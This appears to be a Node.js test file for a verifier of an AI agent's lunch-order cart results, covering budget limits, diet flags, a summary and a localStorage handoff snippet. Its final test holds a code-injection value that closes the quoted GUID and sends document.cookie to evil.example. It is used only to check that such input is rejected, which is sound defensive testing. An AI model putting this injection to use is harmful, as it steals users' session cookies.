const test = require('node:test');
const assert = require('node:assert/strict');
const { verify, formatSummary } = require('../verify');

const payload = {
  session_date: '2026-10-21',
  pickup_time: '11:45',
  cost_limit_usd: 14.5,
  site_url: 'https://treehouse.toast.site/order/ordertreehouse',
  orders: [
    { order_id: 1, label: 'AA', raw_order: 'synthetic: a $14.50 salad', raw_diet: 'no mushrooms' },
    { order_id: 2, label: 'BB', raw_order: 'synthetic: three entrées', raw_diet: '' },
    { order_id: 3, label: 'CC', raw_order: 'synthetic: veggie plate', raw_diet: 'vegetarian' },
    { order_id: 4, label: 'DD', raw_order: 'synthetic: bowl + canned soda', raw_diet: '' },
  ],
};

const line = (item, price, si) => ({ item, modifiers: [], special_instructions: si, price_usd: price });

function goodResult() {
  return {
    session_date: '2026-10-21',
    pickup_time_set: false,
    cart_handoff: {
      local_storage_key: 'toast-embedded-oo-cart|11111111-2222-4333-8444-555555555555',
      cart_guid: 'aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee',
    },
    orders: [
      { order_id: 1, status: 'in_cart', lines: [line('Chicken Caesar Salad', 14.5, 'AA')],
        phase_a_subtotal_usd: 14.5, budget_status: 'PASS', diet_status: 'PASS', flags: [] },
      // Three entrées ($37.50): per policy, first entrée goes in, flagged.
      { order_id: 2, status: 'in_cart', lines: [line('Grilled Fish Tostada', 12.25, 'BB')],
        phase_a_subtotal_usd: 12.25, budget_status: 'TRIMMED', diet_status: 'NONE',
        flags: ['3 entrées requested ($37.50); kept first only'] },
      { order_id: 3, status: 'skipped', lines: [], budget_status: 'PASS', diet_status: 'UNSURE',
        diet_question: 'Are the Mexican rice and pinto beans made with meat stock or lard?',
        skip_reason: 'diet UNSURE (unattended mode)' },
      { order_id: 4, status: 'in_cart',
        lines: [line('Teriyaki Chicken Bowl', 12.25, 'DD'), line('Canned Soda', 2.0, 'DD - Diet Coke')],
        phase_a_subtotal_usd: 14.25, budget_status: 'PASS', diet_status: 'NONE', flags: [] },
    ],
  };
}

test('exactly $14.50 passes (inclusive limit), trimmed multi-entrée passes', () => {
  const report = verify(payload, goodResult());
  assert.deepEqual(report.errors, []);
  assert.equal(report.ok, true);
  assert.equal(report.grandTotalCents, 1450 + 1225 + 1425);
  assert.equal(report.unsure.length, 1);
});

test('one cent over the limit fails', () => {
  const r = goodResult();
  r.orders[0].lines[0].price_usd = 14.51;
  r.orders[0].phase_a_subtotal_usd = 14.51;
  const report = verify(payload, r);
  assert.equal(report.ok, false);
  assert.match(report.errors.join('\n'), /order 1: cart total \$14\.51 exceeds limit \$14\.50/);
});

test('untrimmed three-entrée order in the cart fails', () => {
  const r = goodResult();
  r.orders[1].lines = [line('Grilled Fish Tostada', 12.25, 'BB'), line('Steak Teriyaki Bowl', 13.25, 'BB'), line('Grilled Steak Burrito', 12.0, 'BB')];
  const report = verify(payload, r);
  assert.match(report.errors.join('\n'), /order 2: cart total \$37\.50 exceeds/);
});

test('float sums do not cause false failures', () => {
  const r = goodResult();
  // 0.1 + 0.2 style drift: 4.85 + 4.85 + 4.80 = 14.50 exactly in cents.
  r.orders[0].lines = [line('a', 4.85, 'AA'), line('b', 4.85, 'AA'), line('c', 4.8, 'AA')];
  assert.equal(verify(payload, r).ok, true);
});

test('missing order, missing skip reason, diet FAIL in cart, UNSURE without question', () => {
  const r = goodResult();
  r.orders = r.orders.filter(o => o.order_id !== 4);
  r.orders[0].diet_status = 'FAIL';
  r.orders[2].skip_reason = '';
  r.orders[2].diet_question = '';
  const errs = verify(payload, r).errors.join('\n');
  assert.match(errs, /order 4: missing from cart_result/);
  assert.match(errs, /order 1: diet FAIL but in cart/);
  assert.match(errs, /order 3: skipped without a skip_reason/);
  assert.match(errs, /order 3: diet UNSURE but no diet_question/);
});

test('line without a cart price fails', () => {
  const r = goodResult();
  delete r.orders[0].lines[0].price_usd;
  assert.match(verify(payload, r).errors.join('\n'), /missing a price/);
});

test('drift and label problems are warnings, not errors', () => {
  const r = goodResult();
  r.orders[3].phase_a_subtotal_usd = 13.25;
  r.orders[3].lines[1].special_instructions = 'Diet Coke';
  const report = verify(payload, r);
  assert.equal(report.ok, true);
  assert.match(report.warnings.join('\n'), /differs from Phase A subtotal/);
  assert.match(report.warnings.join('\n'), /don't start with label "DD"/);
});

test('summary mentions pickup time and skipped reasons', () => {
  const r = goodResult();
  const text = formatSummary(payload, r, verify(payload, r));
  assert.match(text, /pickup 11:45/);
  assert.match(text, /SELECT THIS AT CHECKOUT/);
  assert.match(text, /#3 CC .*diet UNSURE/);
  assert.match(text, /CHECKS PASSED/);
});

test('snippet is built from the validated key and GUID', () => {
  const report = verify(payload, goodResult());
  assert.equal(report.snippet,
    'localStorage.setItem("toast-embedded-oo-cart|11111111-2222-4333-8444-555555555555", "aaaaaaaa-bbbb-4ccc-8ddd-eeeeeeeeeeee"); location.reload();');
  assert.match(formatSummary(payload, goodResult(), report), /paste:\n  localStorage\.setItem/);
});

test('agent-supplied code in the handoff is rejected, never echoed as a snippet', () => {
  const r = goodResult();
  r.cart_handoff.cart_guid = "x'); fetch('https://evil.example/'+document.cookie); ('";
  const report = verify(payload, r);
  assert.equal(report.ok, false);
  assert.equal(report.snippet, null);
  assert.match(report.errors.join('\n'), /not a GUID/);

  const r2 = goodResult();
  r2.cart_handoff.local_storage_key = 'toast-auth-token';
  assert.match(verify(payload, r2).errors.join('\n'), /expected "toast-embedded-oo-cart\|<GUID>"/);

  const r3 = goodResult();
  delete r3.cart_handoff;
  assert.equal(verify(payload, r3).ok, false);
});
